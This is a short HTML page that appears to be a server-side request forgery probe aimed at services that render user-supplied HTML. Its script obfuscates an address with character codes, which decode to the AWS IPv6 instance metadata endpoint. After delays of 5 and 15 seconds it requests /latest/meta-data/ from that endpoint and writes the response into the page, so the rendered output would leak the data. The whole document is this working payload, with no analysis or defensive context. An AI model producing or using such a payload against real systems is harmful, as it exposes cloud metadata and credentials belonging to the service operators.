<!DOCTYPE html>
<html><body>
<h1>SETTIMEOUT_TEST</h1>
<div id="r1">INITIAL</div>
<div id="r2">INITIAL</div>
<div id="r3">INITIAL</div>
<script>
var start = Date.now();

// Immediate marker
document.getElementById('r1').innerText = 'IMMEDIATE:' + (Date.now()-start) + 'ms';

// Delayed XHR after 5 seconds
setTimeout(function() {
  try {
    var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
    var proto = String.fromCharCode(104,116,116,112);
    var xhr = new XMLHttpRequest();
    xhr.open('GET', proto + '://[' + ip + ']/latest/meta-data/', false);
    xhr.send();
    document.getElementById('r2').innerText = 'DELAYED_5s_STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,1000);
  } catch(e) {
    document.getElementById('r2').innerText = 'DELAYED_5s_ERROR:' + e.name + ':' + e.message;
  }
}, 5000);

// Delayed XHR after 15 seconds  
setTimeout(function() {
  try {
    var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
    var proto = String.fromCharCode(104,116,116,112);
    var xhr = new XMLHttpRequest();
    xhr.open('GET', proto + '://[' + ip + ']/latest/meta-data/', false);
    xhr.send();
    document.getElementById('r3').innerText = 'DELAYED_15s_STATUS:' + xhr.status + ' BODY:' + xhr.responseText.substr(0,1000);
  } catch(e) {
    document.getElementById('r3').innerText = 'DELAYED_15s_ERROR:' + e.name + ':' + e.message;
  }
}, 15000);
</script>
</body></html>
